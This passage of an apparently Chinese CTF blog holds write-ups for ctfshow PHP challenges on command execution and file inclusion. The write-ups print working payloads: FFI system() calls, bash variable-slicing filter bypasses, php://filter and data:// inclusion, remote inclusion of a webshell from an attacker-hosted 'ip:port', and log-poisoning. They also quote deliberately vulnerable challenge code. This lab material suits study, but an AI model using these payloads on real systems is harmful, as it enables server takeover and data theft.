&#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,</span><br><span class="line">&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row)</span><br><span class="line">&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-</span><br><span class="line">&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure><p>浅浅分析: <a href="https://blog.csdn.net/m0_48780534/article/details/125095560">大佬博客</a>再此, 如果想要知道数据库名字似乎要从前面的题目获取</p><p>PDO 为PHP访问数据库定义了一个轻量级的一致接口，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。<code>new PDO($dsn, $user, $pass);</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"><span class="comment"># 在MySQL中,load_file(完整路径)函数读取一个文件并将其内容作为字符串返回。</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125;<span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h2 id="web77"><a class="header-anchor" href="#web77">¶</a>web77</h2><ul><li>描述: 没有</li></ul><p>源码也没有, 哦牛皮; 直接开套, 得到本题flag为flag36x.txt</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;); foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125; exit(0);?&gt;</span><br></pre></td></tr></table></figure><p>然后来看看远处的wp吧朋友们, payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);$a=&#x27;/readflag &gt; 1.txt&#x27;;$ffi-&gt;system($a);</span><br></pre></td></tr></table></figure><p>FFI(Foreign Function Interface), 即外部函数接口, php7.4以上才有, <a href="https://www.php.net/manual/zh/ffi.cdef.php">php官方解析</a></p><p>FFI指在一种语言里调用另一种语言代码的技术; PHP的FFI扩展就是一个让你在PHP里调用C代码的技术, 上面的payload解释如下, 访问1.txt即可得到flag</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);<span class="comment">//创建一个system对象</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="comment">//没有回显，所以将内容输出到1.txt</span></span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);<span class="comment">//通过$ffi去调用system函数</span></span><br></pre></td></tr></table></figure><h2 id="web118"><a class="header-anchor" href="#web118">¶</a>web118</h2><ul><li>描述: flag in flag.php, by yu22x</li></ul><p><a href="https://blog.csdn.net/Myon5/article/details/140145005">web118详解</a></p><p>通过单个字符爆破登录框得到可用的字符, 其中包括大括号, 冒号, 问号和部分字母</p><p>利用内置变量的切片, 可以切出我们想要的字符; 拼接起来组合成命令<code>nl</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;PATH:~Q&#125;$&#123;PWD:~Q&#125; ????.???</span><br></pre></td></tr></table></figure><p>其中, <code>~</code>是从字符串末尾开始切片, 我们只需要最后那个字母, 所以只需要<code>~0</code>; 而任意的大小写字母与数字0等效, 选一个可用的字母即可</p><blockquote><p><code>$PWD</code>应该是<code>/var/www/html</code>, 取l; <code>$PATH</code>最后一个单词肯定是<code>bin</code>, 取n</p></blockquote><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241009195813055.png" alt="image-20241009195813055"></p><p>还有另一种比较长的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;PATH:$&#123;#HOME&#125;:$&#123;#SHLVL&#125;&#125;$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125; ?$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125;??.???</span><br><span class="line"></span><br><span class="line"># 在Bash中，`$&#123;#var&#125;`的语法用于获取变量var的长度, 其实就是将这些数字应用到切片中去，绕过对数字的过滤</span><br></pre></td></tr></table></figure><h2 id="web119"><a class="header-anchor" href="#web119">¶</a>web119</h2><ul><li>描述: 无</li></ul><p>过滤了PATH和BASH</p><p>同理, 用上面的内置变量加切片的方法绕过过滤, 构造我们想要的命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># $&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; == t</span><br><span class="line"># $&#123;PWD:$&#123;Z&#125;:$&#123;#SHLVL&#125;&#125; == /</span><br><span class="line"># $RANDOM会生成一个随机数, 这个数字是4到5位, 结合上面我们可以得到数字4或5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;??$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ????.???</span><br><span class="line"># /bin/cat flag.php</span><br><span class="line"></span><br><span class="line">$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</span><br><span class="line"># /bin/base64 flag.php</span><br></pre></td></tr></table></figure><p>还可以继续用<code>nl</code>(题目环境不允许, 不是解题方法), 查一下怎么输出所有内置变量然后去构造</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># $LANG = en_US.UTF-8, 这里还有个n, 切片方法为$&#123;LANG:$&#123;#SHLVL&#125;:$&#123;#SHLVL&#125;&#125;</span><br><span class="line"></span><br><span class="line">$&#123;LANG:$&#123;#SHLVL&#125;:$&#123;#SHLVL&#125;&#125;$&#123;PWD:~Q&#125; ????.???</span><br></pre></td></tr></table></figure><h2 id="web120"><a class="header-anchor" href="#web120">¶</a>web120</h2><ul><li>描述: by yu22x</li></ul><p>给源码了; 过滤HOME, base64的payload可以继续使用, 这次构造的是a而不是t</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span><br><span class="line"># /bin/cat flag.php</span><br></pre></td></tr></table></figure><p>这次需要查看网页源代码才能搜索到ctfshow</p><h2 id="web121"><a class="header-anchor" href="#web121">¶</a>web121</h2><ul><li>描述: by yu22x 师傅们 留口饭吃</li></ul><p>过滤了~, SHLVL, 限制了长度小于65;</p><p>base64的读取只需要稍作修改</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># SHLVL被过滤, 我们使用$&#123;#?&#125;或$&#123;##&#125;代替</span><br><span class="line"></span><br><span class="line">$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</span><br></pre></td></tr></table></figure><p>还可以用<code>/bin/rev</code>, 即<code>rev</code>, 将文件内容读取并进行反转</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;#?&#125;&#125;?? ????.???</span><br></pre></td></tr></table></figure><h2 id="web124"><a class="header-anchor" href="#web124">¶</a>web124</h2><ul><li>描述: RCE</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 收集自网络</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-06 14:04:45</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了一些符号, 使用的字母必须是数学函数的白名单里的字母, 长度不能大于80</p><p>我们可以通过<code>$_GET[]</code>传参来绕过过滤, <code>[]</code>可以用<code>&#123;&#125;</code>代替, 再利用进制转换来构造我们需要的字符</p><ul><li><code>base_convert</code> : 在任意进制之间转换数字。</li><li><code>hexdec</code> : 把十六进制转换为十进制。</li><li><code>dechex</code> : 把十进制转换为十六进制。</li><li><code>hex2bin</code> : 把十六进制的字符串转换为ASCII码</li></ul><blockquote><p>没有<code>hex2bin</code>需要使用<code>base_convert</code>构造出来</p></blockquote><p>需要两个参数, 一个传递函数名, 一个传递函数参数值:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_GET&#123;abs&#125;($_GET&#123;acos&#125;)</span><br></pre></td></tr></table></figure><p>接下来构造<code>_GET</code>:</p><p><code>_GET</code>转成十六进制是<code>0x5f474554</code>, 由十六进制转为十进制<code>1598506324</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_GET == hex2bin(dechex(1598506324))</span><br><span class="line"># 没有hex2bin, 构造它</span><br><span class="line">base_convert(37907361743,10,36) == hex2bin</span><br><span class="line"># 得到:</span><br><span class="line">_GET == base_convert(37907361743,10,36)(dechex(1598506324))</span><br><span class="line"># 避免超长, 变量都选择最短的:</span><br><span class="line">$pi=base_convert(37907361743,10,36)(dechex(1598506324))</span><br></pre></td></tr></table></figure><blockquote><p>这里base_convert写36进制, 是为了能把所有字符都表示进来, 10+26=36</p></blockquote><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;acos&#125;);&amp;abs=system&amp;acos=cat flag.php</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctfshow靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具利用 </tag>
            
            <tag> 绕过 </tag>
            
            <tag> RCE </tag>
            
            <tag> PHP </tag>
            
            <tag> 文件包含 </tag>
            
            <tag> FFI </tag>
            
            <tag> 内置变量 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web入门_文件包含</title>
      <link href="/article/ctfshow-webbasic-fileinclude/"/>
      <url>/article/ctfshow-webbasic-fileinclude/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>文件包含</h1><hr><h2 id="web78"><a class="header-anchor" href="#web78">¶</a>web78</h2><ul><li>描述: 文件包含系列开始</li></ul><p>没有过滤, 直接包含似乎不显示, 还是用伪协议吧</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="web79"><a class="header-anchor" href="#web79">¶</a>web79</h2><ul><li>描述: 同上</li></ul><p>过滤php, 那就成data</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure><p>记得如果执行命令也要编码, 因为用的<code>&lt;?php</code>, payload如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/Pg==# ls</span><br><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=</span><br><span class="line"># cat flag.php</span><br></pre></td></tr></table></figure><h2 id="web80"><a class="header-anchor" href="#web80">¶</a>web80</h2><ul><li>描述: 同上</li></ul><p>两个都没了, 怎么办呢, 可以用远程文件包含和日志文件包含</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure><p>payload1:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=http://ip:port/cmd.txt</span><br><span class="line"># 文件中是 &lt;?php @eval($_POST[cmd]); ?&gt;, 利用POST执行即可</span><br></pre></td></tr></table></figure><p>日志包含, 本题Web服务器是Nginx</p><p>payload2:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 首先将User-Agent改成一句话木马然后正常访问</span><br><span class="line"># 然后url加上以下字符串然后蚁剑连接</span><br><span class="line">?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><h2 id="web81"><a class="header-anchor" href="#web81">¶</a>web81</h2><ul><li>描述: 做完这道题，你就已经经历的九九八十一难，是不是感觉很快？没关系，后面还是九百一十九难，加油吧，少年！</li></ul><p>那就不能远程包含了, 那就日只包含</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure><p>payload同上一题</p><h2 id="web82-86"><a class="header-anchor" href="#web82-86">¶</a>web82-86</h2><ul><li>描述: 竞争环境需要晚上11点30分至次日7时30分之间做，其他时间不开放竞争条件</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure><p>现在是早上, 遗憾离场</p><p><a href="https://blog.csdn.net/qq_46091464/article/details/108021053">类似题目</a>和<a href="https://www.freebuf.com/vuls/202819.html">session.upload_progress详解</a></p><h2 id="web87"><a class="header-anchor" href="#web87">¶</a>web87</h2><ul><li>描述: 继续秀</li></ul><p>过滤了点,可以通过双重url编码绕过, 但是这种类似于死亡die和死亡exit的, 还得是<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">P神-谈一谈php://filter的妙用</a>以及<a href="https://xz.aliyun.com/t/8163?time__1311=n4%2BxuDgDBDyGKAKD%3DD7Dl1oQGQWwx0KwI%3Di4x&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F8163#toc-3">file_put_content和死亡·杂糅代码之缘</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure><p>思路一般是想要将杂糅或者死亡代码分解成php无法识别的代码, 基本上都是利用php伪协议filter, 结合编码或者相应的过滤器进行绕过</p><p><strong>base64编码绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET</span><br><span class="line">?file=%2570%2568%2570%253a%252f%252f%2566%2569%256c%2574%2565%2572%252f%2577%2572%2569%2574%2565%253d%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2564%2565%2563%256f%2564%2565%252f%2572%2565%2573%256f%2575%2572%2563%2565%253d%2561%252e%2570%2568%2570</span><br><span class="line"># file=php://filter/write=convert.base64-decode/resource=a.php</span><br><span class="line"># 或者file=php://filter/convert.base64-decode/resource=a.php</span><br><span class="line"></span><br><span class="line">POST</span><br><span class="line">content=aaPD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4=</span><br><span class="line"># content=&lt;?php eval($_POST[cmd]);?&gt;</span><br><span class="line"></span><br><span class="line">前面的11是为了填充&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span><br><span class="line">base64是4位4位解码，其中&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;解码的内容只有phpdie，所以需要再填充两位。</span><br></pre></td></tr></table></figure><p><strong>rot13编码绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET</span><br><span class="line">?file=%2570%2568%2570%253a%252f%252f%2566%2569%256c%2574%2565%2572%252f%2573%2574%2572%2569%256e%2567%252e%2572%256f%2574%2531%2533%252f%2572%2565%2573%256f%2575%2572%2563%2565%253d%2563%252e%2570%2568%2570</span><br><span class="line"># file=php://filter/string.rot13/resource=c.php</span><br><span class="line"></span><br><span class="line">POST</span><br><span class="line">content=&lt;?cuc riny($_CBFG[pzq]);?&gt;</span><br><span class="line"># content=&lt;?php eval($_POST[cmd]);?&gt;</span><br></pre></td></tr></table></figure><p>然后直接访问生成的php文件即可执行命令</p><h2 id="web88"><a class="header-anchor" href="#web88">¶</a>web88</h2><ul><li>描述: 同上</li></ul><p>换成正则了, 没事, 问号没去掉, 我们继续用data</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure><p>至于为什么file还有=不会被过滤, 因为这里的<code>=</code>是用来传参的, 不会被划分到变量中; 还有在base64中, 最后的等号是用于占位的, 就算去掉也不会对解码有影响</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ls</span><br><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKGxzKTs/Pg</span><br><span class="line"># cat fl0g.php</span><br><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTs/Pg</span><br></pre></td></tr></table></figure><h2 id="web116"><a class="header-anchor" href="#web116">¶</a>web116</h2><ul><li>描述: misc+lfi</li></ul><p>将视频下载下来, 用winhex之类的打开, 翻一翻, 找到了很多类似PNG头的东西, 然后再找找尾巴(END), 注意正确的PNG头是<code>89 50 4E 47</code>, END为<code>49 45 4E 44</code></p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240707202332622.png" alt="image-20240707202332622"></p><blockquote><p>冷知识, 双击文件尾巴(END)然后再双击PNG头可以立刻选中这一大片区域</p></blockquote><p>另存为PNG, 打开发现是代码片段:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span 